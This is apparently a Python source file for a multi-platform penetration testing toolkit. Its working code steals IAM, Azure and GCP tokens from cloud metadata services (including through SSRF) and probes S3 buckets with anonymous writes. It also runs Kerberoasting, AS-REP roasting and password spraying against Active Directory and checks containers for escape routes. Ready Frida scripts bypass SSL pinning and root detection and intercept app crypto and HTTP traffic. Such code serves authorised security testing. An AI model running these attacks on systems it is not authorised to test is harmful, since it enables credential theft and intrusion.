"""
Cloud Security Engine
======================
AWS, Azure, GCP, Kubernetes testing:
- S3/Blob/GCS bucket misconfigurations
- IAM policy analysis
- Metadata service exploitation
- Cloud function enumeration
- Secrets Manager access
- Kubernetes API abuse
"""

import asyncio
import json
import re
import time
import subprocess
from typing import Dict, Any, Optional, List
from dataclasses import dataclass, field


class CloudSecurityEngine:
    """Unified cloud security testing engine"""
    
    def __init__(self):
        self.findings: List[Dict] = []
    
    # ========================================================================
    # AWS
    # ========================================================================
    
    async def test_s3_bucket(self, bucket_name: str) -> Dict:
        """Test S3 bucket for misconfigurations"""
        results = {
            "bucket": bucket_name,
            "tests": {}
        }
        
        # Test listing
        try:
            proc = await asyncio.create_subprocess_exec(
                "aws", "s3", "ls", f"s3://{bucket_name}", "--no-sign-request",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            
            results["tests"]["list_no_auth"] = {
                "success": proc.returncode == 0,
                "output": stdout.decode()[:500] if proc.returncode == 0 else stderr.decode()[:200]
            }
            
            if proc.returncode == 0:
                self.findings.append({
                    "type": "s3_public_listing",
                    "severity": "high",
                    "bucket": bucket_name,
                    "detail": "Bucket allows unauthenticated listing"
                })
        except FileNotFoundError:
            results["tests"]["list_no_auth"] = {"error": "aws CLI not available"}
        
        # Test ACL
        try:
            proc = await asyncio.create_subprocess_exec(
                "aws", "s3api", "get-bucket-acl", "--bucket", bucket_name, "--no-sign-request",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            
            results["tests"]["get_acl"] = {
                "success": proc.returncode == 0,
                "output": stdout.decode()[:500] if proc.returncode == 0 else ""
            }
        except FileNotFoundError:
            pass
        
        # Test upload
        try:
            proc = await asyncio.create_subprocess_exec(
                "aws", "s3", "cp", "/dev/null", f"s3://{bucket_name}/test_write_probe.txt",
                "--no-sign-request",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            
            results["tests"]["write_no_auth"] = {
                "success": proc.returncode == 0,
            }
            
            if proc.returncode == 0:
                self.findings.append({
                    "type": "s3_public_write",
                    "severity": "critical",
                    "bucket": bucket_name,
                    "detail": "Bucket allows unauthenticated writes!"
                })
                # Clean up
                await asyncio.create_subprocess_exec(
                    "aws", "s3", "rm", f"s3://{bucket_name}/test_write_probe.txt", "--no-sign-request"
                )
        except FileNotFoundError:
            pass
        
        return results
    
    async def enumerate_aws_metadata(self, ssrf_url: str = None) -> Dict:
        """Enumerate AWS metadata service (via SSRF or direct)"""
        import aiohttp
        
        base_url = ssrf_url or "http://169.254.169.254"
        paths = [
            "/latest/meta-data/",
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/hostname",
            "/latest/meta-data/local-ipv4",
            "/latest/meta-data/public-ipv4",
            "/latest/meta-data/ami-id",
            "/latest/user-data",
            "/latest/dynamic/instance-identity/document",
        ]
        
        results = {}
        try:
            async with aiohttp.ClientSession() as session:
                for path in paths:
                    url = f"{base_url}{path}"
                    try:
                        # Try IMDSv1
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                            if resp.status == 200:
                                body = await resp.text()
                                results[path] = body[:500]
                                
                                # If we found IAM role, get credentials
                                if "security-credentials" in path and body.strip():
                                    role_name = body.strip().split("\n")[0]
                                    cred_url = f"{base_url}/latest/meta-data/iam/security-credentials/{role_name}"
                                    async with session.get(cred_url) as cred_resp:
                                        if cred_resp.status == 200:
                                            creds = await cred_resp.text()
                                            results["credentials"] = creds[:500]
                                            self.findings.append({
                                                "type": "aws_credential_exposure",
                                                "severity": "critical",
                                                "detail": f"IAM role credentials accessible: {role_name}"
                                            })
                    except Exception:
                        continue
        except Exception:
            pass
        
        return {"metadata": results, "accessible": len(results) > 0}
    
    async def test_aws_keys(self, access_key: str, secret_key: str) -> Dict:
        """Test what an AWS key pair can access"""
        import os
        
        env = os.environ.copy()
        env["AWS_ACCESS_KEY_ID"] = access_key
        env["AWS_SECRET_ACCESS_KEY"] = secret_key
        
        tests = [
            ("sts", "get-caller-identity"),
            ("s3", "ls"),
            ("iam", "list-users"),
            ("iam", "list-roles"),
            ("lambda", "list-functions"),
            ("ec2", "describe-instances", "--region", "us-east-1"),
            ("secretsmanager", "list-secrets", "--region", "us-east-1"),
        ]
        
        results = {}
        for test in tests:
            service = test[0]
            action = test[1]
            extra_args = list(test[2:]) if len(test) > 2 else []
            
            try:
                proc = await asyncio.create_subprocess_exec(
                    "aws", service, action, *extra_args,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    env=env
                )
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)
                
                results[f"{service}:{action}"] = {
                    "success": proc.returncode == 0,
                    "output": stdout.decode()[:300] if proc.returncode == 0 else ""
                }
            except (asyncio.TimeoutError, FileNotFoundError):
                results[f"{service}:{action}"] = {"error": "timeout or not available"}
        
        return results
    
    # ========================================================================
    # KUBERNETES
    # ========================================================================
    
    async def test_kubernetes_api(self, api_url: str, token: str = None) -> Dict:
        """Test Kubernetes API for misconfigurations"""
        import aiohttp
        
        headers = {}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        
        endpoints = [
            "/api/v1/namespaces",
            "/api/v1/pods",
            "/api/v1/secrets",
            "/api/v1/configmaps",
            "/apis/apps/v1/deployments",
            "/api/v1/nodes",
            "/api/v1/services",
            "/apis/rbac.authorization.k8s.io/v1/clusterroles",
        ]
        
        results = {}
        try:
            async with aiohttp.ClientSession() as session:
                for endpoint in endpoints:
                    url = f"{api_url}{endpoint}"
                    try:
                        async with session.get(url, headers=headers, ssl=False,
                                             timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            results[endpoint] = {
                                "status": resp.status,
                                "accessible": resp.status == 200,
                                "items_count": 0
                            }
                            if resp.status == 200:
                                data = await resp.json()
                                results[endpoint]["items_count"] = len(data.get("items", []))
                                
                                if "secrets" in endpoint:
                                    self.findings.append({
                                        "type": "k8s_secrets_accessible",
                                        "severity": "critical",
                                        "detail": f"Secrets accessible: {results[endpoint]['items_count']} found"
                                    })
                    except Exception:
                        results[endpoint] = {"error": "connection failed"}
        except Exception as e:
            return {"error": str(e)}
        
        return {"api_url": api_url, "results": results}
    
    # ========================================================================
    # AZURE
    # ========================================================================
    
    async def test_azure_metadata(self, ssrf_url: str = None) -> Dict:
        """Test Azure IMDS"""
        import aiohttp
        
        base_url = ssrf_url or "http://169.254.169.254"
        headers = {"Metadata": "true"}
        
        paths = [
            "/metadata/instance?api-version=2021-02-01",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ]
        
        results = {}
        try:
            async with aiohttp.ClientSession() as session:
                for path in paths:
                    try:
                        async with session.get(f"{base_url}{path}", headers=headers,
                                             timeout=aiohttp.ClientTimeout(total=5)) as resp:
                            if resp.status == 200:
                                results[path] = (await resp.text())[:500]
                    except Exception:
                        continue
        except Exception:
            pass
        
        return {"azure_metadata": results, "accessible": len(results) > 0}
    
    # ========================================================================
    # GCP
    # ========================================================================
    
    async def test_gcp_metadata(self, ssrf_url: str = None) -> Dict:
        """Test GCP metadata service"""
        import aiohttp
        
        base_url = ssrf_url or "http://metadata.google.internal"
        headers = {"Metadata-Flavor": "Google"}
        
        paths = [
            "/computeMetadata/v1/project/project-id",
            "/computeMetadata/v1/instance/service-accounts/default/token",
            "/computeMetadata/v1/instance/service-accounts/default/email",
            "/computeMetadata/v1/instance/attributes/",
        ]
        
        results = {}
        try:
            async with aiohttp.ClientSession() as session:
                for path in paths:
                    try:
                        async with session.get(f"{base_url}{path}", headers=headers,
                                             timeout=aiohttp.ClientTimeout(total=5)) as resp:
                            if resp.status == 200:
                                results[path] = (await resp.text())[:500]
                                
                                if "token" in path:
                                    self.findings.append({
                                        "type": "gcp_token_exposed",
                                        "severity": "critical",
                                        "detail": "GCP service account token accessible via metadata"
                                    })
                    except Exception:
                        continue
        except Exception:
            pass
        
        return {"gcp_metadata": results, "accessible": len(results) > 0}


# ============================================================================
# ACTIVE DIRECTORY ENGINE
# ============================================================================

class ADSecurityEngine:
    """
    Active Directory security testing:
    - Kerberoasting
    - AS-REP Roasting
    - BloodHound integration
    - ADCS exploitation (ESC1-ESC16)
    - Password spraying
    - LDAP enumeration
    """
    
    def __init__(self):
        self.findings: List[Dict] = []
        self.domain_info: Dict = {}
    
    async def kerberoast(self, domain: str, username: str, password: str,
                        dc_ip: str) -> Dict:
        """Perform Kerberoasting attack"""
        try:
            proc = await asyncio.create_subprocess_exec(
                "impacket-GetUserSPNs",
                f"{domain}/{username}:{password}",
                "-dc-ip", dc_ip,
                "-request",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
            output = stdout.decode()
            
            # Count tickets
            tickets = re.findall(r'\$krb5tgs\$', output)
            
            if tickets:
                self.findings.append({
                    "type": "kerberoastable_accounts",
                    "severity": "high",
                    "count": len(tickets),
                    "detail": f"Found {len(tickets)} Kerberoastable service accounts"
                })
            
            return {
                "tickets_found": len(tickets),
                "output": output[:2000],
                "success": proc.returncode == 0
            }
        except FileNotFoundError:
            return {"error": "impacket-GetUserSPNs not installed"}
        except Exception as e:
            return {"error": str(e)}
    
    async def asrep_roast(self, domain: str, userlist: List[str],
                         dc_ip: str) -> Dict:
        """AS-REP Roasting - find accounts with no pre-auth"""
        try:
            # Write userlist to temp file
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write('\n'.join(userlist))
                userlist_file = f.name
            
            proc = await asyncio.create_subprocess_exec(
                "impacket-GetNPUsers",
                f"{domain}/",
                "-usersfile", userlist_file,
                "-dc-ip", dc_ip,
                "-format", "hashcat",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
            output = stdout.decode()
            
            hashes = re.findall(r'\$krb5asrep\$', output)
            
            if hashes:
                self.findings.append({
                    "type": "asrep_roastable",
                    "severity": "high",
                    "count": len(hashes),
                    "detail": f"Found {len(hashes)} accounts without Kerberos pre-auth"
                })
            
            return {
                "vulnerable_accounts": len(hashes),
                "output": output[:2000],
                "success": proc.returncode == 0
            }
        except FileNotFoundError:
            return {"error": "impacket-GetNPUsers not installed"}
        except Exception as e:
            return {"error": str(e)}
    
    async def enumerate_adcs(self, domain: str, username: str, 
                            password: str, dc_ip: str) -> Dict:
        """Enumerate ADCS for ESC vulnerabilities"""
        try:
            proc = await asyncio.create_subprocess_exec(
                "certipy", "find",
                "-u", f"{username}@{domain}",
                "-p", password,
                "-dc-ip", dc_ip,
                "-vulnerable",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            output = stdout.decode()
            
            # Parse ESC vulnerabilities
            esc_patterns = [f"ESC{i}" for i in range(1, 17)]
            found_escs = []
            for esc in esc_patterns:
                if esc in output:
                    found_escs.append(esc)
            
            if found_escs:
                self.findings.append({
                    "type": "adcs_vulnerable",
                    "severity": "critical",
                    "vulnerabilities": found_escs,
                    "detail": f"ADCS vulnerabilities found: {', '.join(found_escs)}"
                })
            
            return {
                "vulnerable": len(found_escs) > 0,
                "esc_vulnerabilities": found_escs,
                "output": output[:2000]
            }
        except FileNotFoundError:
            return {"error": "certipy not installed"}
        except Exception as e:
            return {"error": str(e)}
    
    async def ldap_enum(self, dc_ip: str, domain: str,
                       username: str = None, password: str = None) -> Dict:
        """LDAP enumeration"""
        try:
            base_dn = ",".join(f"DC={part}" for part in domain.split("."))
            
            args = ["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-b", base_dn]
            
            if username and password:
                args.extend(["-D", f"{username}@{domain}", "-w", password])
            
            # Get users
            user_args = args + ["(objectClass=user)", "sAMAccountName", "description"]
            
            proc = await asyncio.create_subprocess_exec(
                *user_args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
            
            users = re.findall(r'sAMAccountName:\s*(\S+)', stdout.decode())
            descriptions = re.findall(r'description:\s*(.+)', stdout.decode())
            
            # Check for passwords in descriptions
            pass_in_desc = [d for d in descriptions if any(
                w in d.lower() for w in ['pass', 'pwd', 'motdepasse', 'password']
            )]
            
            if pass_in_desc:
                self.findings.append({
                    "type": "password_in_description",
                    "severity": "high",
                    "count": len(pass_in_desc),
                    "detail": "Passwords found in user description fields"
                })
            
            return {
                "users_found": len(users),
                "users": users[:50],
                "passwords_in_descriptions": pass_in_desc[:5]
            }
        except FileNotFoundError:
            return {"error": "ldapsearch not installed"}
        except Exception as e:
            return {"error": str(e)}
    
    async def password_spray(self, domain: str, userlist: List[str],
                            password: str, dc_ip: str) -> Dict:
        """Password spraying against AD"""
        try:
            proc = await asyncio.create_subprocess_exec(
                "netexec", "smb", dc_ip,
                "-d", domain,
                "-u", ",".join(userlist[:50]),  # Limit to avoid lockout
                "-p", password,
                "--no-bruteforce",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            output = stdout.decode()
            
            # Find successful logins
            successes = re.findall(r'\[.\]\s+(\S+).*\(Pwn3d!\)', output)
            valid_creds = re.findall(r'\[\+\]\s+(\S+)', output)
            
            return {
                "valid_credentials": valid_creds,
                "admin_access": successes,
                "output": output[:2000]
            }
        except FileNotFoundError:
            return {"error": "netexec not installed"}
        except Exception as e:
            return {"error": str(e)}


# ============================================================================
# MOBILE SECURITY ENGINE
# ============================================================================

class MobileSecurityEngine:
    """
    Mobile application security testing:
    - APK static analysis
    - Certificate pinning detection
    - Hardcoded secrets detection
    - Exported components
    - Deep link analysis
    """
    
    def __init__(self):
        self.findings: List[Dict] = []
    
    async def analyze_apk(self, apk_path: str) -> Dict:
        """Static analysis of APK file"""
        results = {
            "manifest": {},
            "permissions": [],
            "components": {},
            "secrets": [],
            "urls": [],
            "certificates": {}
        }
        
        # Decompile with apktool
        try:
            import tempfile
            output_dir = tempfile.mkdtemp()
            
            proc = await asyncio.create_subprocess_exec(
                "apktool", "d", apk_path, "-o", output_dir, "-f",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await asyncio.wait_for(proc.communicate(), timeout=120)
            
            # Parse AndroidManifest.xml
            manifest_path = f"{output_dir}/AndroidManifest.xml"
            try:
                with open(manifest_path) as f:
                    manifest = f.read()
                
                # Extract permissions
                results["permissions"] = re.findall(
                    r'android:name="android\.permission\.(\w+)"', manifest
                )
                
                # Extract exported components
                results["components"] = {
                    "activities": re.findall(r'<activity[^>]*android:name="([^"]+)"[^>]*android:exported="true"', manifest),
                    "services": re.findall(r'<service[^>]*android:name="([^"]+)"[^>]*android:exported="true"', manifest),
                    "receivers": re.findall(r'<receiver[^>]*android:name="([^"]+)"[^>]*android:exported="true"', manifest),
                    "providers": re.findall(r'<provider[^>]*android:name="([^"]+)"[^>]*android:exported="true"', manifest),
                }
                
                # Deep links
                results["deep_links"] = re.findall(
                    r'android:scheme="([^"]+)"', manifest
                )
                
                # Backup allowed?
                if 'android:allowBackup="true"' in manifest:
                    self.findings.append({
                        "type": "backup_enabled",
                        "severity": "medium",
                        "detail": "Application allows backup (data extraction possible)"
                    })
                
                # Debuggable?
                if 'android:debuggable="true"' in manifest:
                    self.findings.append({
                        "type": "debuggable",
                        "severity": "high",
                        "detail": "Application is debuggable"
                    })
                
            except FileNotFoundError:
                pass
            
            # Search for hardcoded secrets in smali/source
            secret_patterns = [
                (r'(?:api[_-]?key|apikey)\s*[=:]\s*["\']([^"\']{10,})["\']', "API Key"),
                (r'(?:password|passwd|pwd)\s*[=:]\s*["\']([^"\']+)["\']', "Password"),
                (r'(?:secret|token)\s*[=:]\s*["\']([^"\']{10,})["\']', "Secret/Token"),
                (r'(AIza[0-9A-Za-z_-]{35})', "Google API Key"),
                (r'(AKIA[0-9A-Z]{16})', "AWS Access Key"),
                (r'(sk-[a-zA-Z0-9]{20,})', "Stripe/OpenAI Key"),
            ]
            
            import os
            for root, dirs, files in os.walk(output_dir):
                for fname in files:
                    if fname.endswith(('.smali', '.xml', '.json', '.properties')):
                        fpath = os.path.join(root, fname)
                        try:
                            with open(fpath, errors='ignore') as f:
                                content = f.read()
                            
                            for pattern, secret_type in secret_patterns:
                                matches = re.findall(pattern, content, re.IGNORECASE)
                                for match in matches:
                                    results["secrets"].append({
                                        "type": secret_type,
                                        "value": match[:50] + "..." if len(match) > 50 else match,
                                        "file": fname
                                    })
                        except Exception:
                            continue
            
            # Extract URLs
            url_pattern = r'https?://[^\s<>"\'\\]+'
            for root, dirs, files in os.walk(output_dir):
                for fname in files:
                    if fname.endswith(('.smali', '.xml', '.json')):
                        fpath = os.path.join(root, fname)
                        try:
                            with open(fpath, errors='ignore') as f:
                                content = f.read()
                            urls = re.findall(url_pattern, content)
                            results["urls"].extend(urls[:100])
                        except Exception:
                            continue
            
            results["urls"] = list(set(results["urls"]))[:200]
            
            if results["secrets"]:
                self.findings.append({
                    "type": "hardcoded_secrets",
                    "severity": "high",
                    "count": len(results["secrets"]),
                    "detail": f"Found {len(results['secrets'])} hardcoded secrets in APK"
                })
            
            return results
            
        except FileNotFoundError:
            return {"error": "apktool not installed"}
        except Exception as e:
            return {"error": str(e)}
    
    def generate_frida_scripts(self, purpose: str) -> str:
        """Generate Frida scripts for dynamic analysis"""
        scripts = {
            "ssl_pinning_bypass": """
Java.perform(function() {
    // Bypass OkHTTP Certificate Pinner
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, certs) {
        console.log('[+] Bypassing OkHTTP cert pinning for: ' + hostname);
        return;
    };
    
    // Bypass TrustManager
    var TrustManager = Java.registerClass({
        name: 'com.custom.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var SSLContextInit = SSLContext.init.overload(
        '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom'
    );
    SSLContextInit.implementation = function(keyManager, trustManager, secureRandom) {
        console.log('[+] Bypassing SSLContext.init');
        SSLContextInit.call(this, keyManager, [TrustManager.$new()], secureRandom);
    };
    
    console.log('[*] SSL Pinning Bypass Active');
});
""",
            "root_detection_bypass": """
Java.perform(function() {
    // Common root detection classes
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        console.log('[+] Bypassing RootBeer isRooted');
        return false;
    };
    
    // File.exists bypass for root files
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootPaths = ['/system/app/Superuser.apk', '/system/xbin/su', '/data/local/bin/su'];
        if (rootPaths.indexOf(path) >= 0) {
            console.log('[+] Hiding root file: ' + path);
            return false;
        }
        return this.exists();
    };
    
    console.log('[*] Root Detection Bypass Active');
});
""",
            "intercept_crypto": """
Java.perform(function() {
    // Intercept encryption/decryption
    var Cipher = Java.use('javax.crypto.Cipher');
    
    Cipher.doFinal.overload('[B').implementation = function(input) {
        var mode = this.getAlgorithm();
        console.log('[CRYPTO] Algorithm: ' + mode);
        console.log('[CRYPTO] Input: ' + bytesToHex(input));
        var result = this.doFinal(input);
        console.log('[CRYPTO] Output: ' + bytesToHex(result));
        return result;
    };
    
    function bytesToHex(bytes) {
        var hex = [];
        for (var i = 0; i < bytes.length; i++) {
            hex.push(('0' + (bytes[i] & 0xFF).toString(16)).slice(-2));
        }
        return hex.join('');
    }
    
    console.log('[*] Crypto Interceptor Active');
});
""",
            "intercept_http": """
Java.perform(function() {
    // Intercept OkHTTP requests
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Interceptor = Java.use('okhttp3.Interceptor');
    
    var MyInterceptor = Java.registerClass({
        name: 'com.custom.Interceptor',
        implements: [Interceptor],
        methods: {
            intercept: function(chain) {
                var request = chain.request();
                console.log('[HTTP] ' + request.method() + ' ' + request.url().toString());
                
                var headers = request.headers();
                for (var i = 0; i < headers.size(); i++) {
                    console.log('[HEADER] ' + headers.name(i) + ': ' + headers.value(i));
                }
                
                var response = chain.proceed(request);
                console.log('[RESPONSE] ' + response.code());
                return response;
            }
        }
    });
    
    console.log('[*] HTTP Interceptor Active');
});
"""
        }
        
        return scripts.get(purpose, f"// No script template for: {purpose}")


# ============================================================================
# CONTAINER SECURITY ENGINE
# ============================================================================

class ContainerSecurityEngine:
    """
    Container security testing:
    - Docker socket exposure
    - Container escape techniques
    - Image vulnerability scanning
    - Kubernetes misconfigurations
    """
    
    def __init__(self):
        self.findings: List[Dict] = []
    
    async def check_docker_socket(self, target: str = "localhost") -> Dict:
        """Check for exposed Docker socket"""
        import aiohttp
        
        urls = [
            f"http://{target}:2375/version",
            f"http://{target}:2376/version",
            f"http://{target}:4243/version",
        ]
        
        results = {}
        try:
            async with aiohttp.ClientSession() as session:
                for url in urls:
                    try:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                results[url] = data
                                self.findings.append({
                                    "type": "docker_socket_exposed",
                                    "severity": "critical",
                                    "url": url,
                                    "detail": f"Docker API exposed: version {data.get('Version')}"
                                })
                    except Exception:
                        continue
        except Exception:
            pass
        
        # Check local socket
        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "--unix-socket", "/var/run/docker.sock",
                "http://localhost/version",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
            if proc.returncode == 0:
                results["unix_socket"] = json.loads(stdout.decode())
                self.findings.append({
                    "type": "docker_socket_local",
                    "severity": "critical",
                    "detail": "Local Docker socket accessible"
                })
        except Exception:
            pass
        
        return {"exposed": len(results) > 0, "results": results}
    
    async def check_container_escape(self) -> Dict:
        """Check for container escape possibilities"""
        checks = {}
        
        # Check if we're in a container
        try:
            with open("/proc/1/cgroup") as f:
                cgroup = f.read()
            checks["in_container"] = "docker" in cgroup or "kubepods" in cgroup
        except Exception:
            checks["in_container"] = False
        
        # Check for privileged mode
        try:
            proc = await asyncio.create_subprocess_exec(
                "fdisk", "-l",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await proc.communicate()
            checks["privileged"] = proc.returncode == 0 and "/dev/" in stdout.decode()
        except Exception:
            checks["privileged"] = False
        
        # Check for dangerous capabilities
        try:
            proc = await asyncio.create_subprocess_exec(
                "cat", "/proc/self/status",
                stdout=asyncio.subprocess.PIPE
            )
            stdout, _ = await proc.communicate()
            cap_line = [l for l in stdout.decode().split('\n') if 'CapEff' in l]
            if cap_line:
                cap_hex = cap_line[0].split('\t')[-1].strip()
                checks["capabilities"] = cap_hex
                # All caps = 000001ffffffffff or higher
                if int(cap_hex, 16) > 0x00000000ffffffff:
                    checks["excessive_caps"] = True
                    self.findings.append({
                        "type": "excessive_capabilities",
                        "severity": "high",
                        "detail": f"Container has excessive capabilities: {cap_hex}"
                    })
        except Exception:
            pass
        
        # Check for mounted Docker socket
        try:
            import os
            checks["docker_socket_mounted"] = os.path.exists("/var/run/docker.sock")
            if checks["docker_socket_mounted"]:
                self.findings.append({
                    "type": "docker_socket_in_container",
                    "severity": "critical",
                    "detail": "Docker socket mounted inside container - escape possible"
                })
        except Exception:
            pass
        
        # Check for host PID namespace
        try:
            proc = await asyncio.create_subprocess_exec(
                "ls", "/proc/1/root",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            _, stderr = await proc.communicate()
            checks["host_pid_ns"] = proc.returncode == 0
        except Exception:
            pass
        
        return checks
    
    async def scan_image(self, image: str) -> Dict:
        """Scan container image for vulnerabilities"""
        try:
            proc = await asyncio.create_subprocess_exec(
                "trivy", "image", "--format", "json", image,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
            
            if proc.returncode == 0:
                results = json.loads(stdout.decode())
                
                # Count by severity
                severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
                for result in results.get("Results", []):
                    for vuln in result.get("Vulnerabilities", []):
                        sev = vuln.get("Severity", "UNKNOWN")
                        if sev in severity_counts:
                            severity_counts[sev] += 1
                
                return {
                    "image": image,
                    "vulnerabilities": severity_counts,
                    "total": sum(severity_counts.values())
                }
            
            return {"error": "Scan failed", "image": image}
        except FileNotFoundError:
            return {"error": "trivy not installed"}
        except Exception as e:
            return {"error": str(e)}
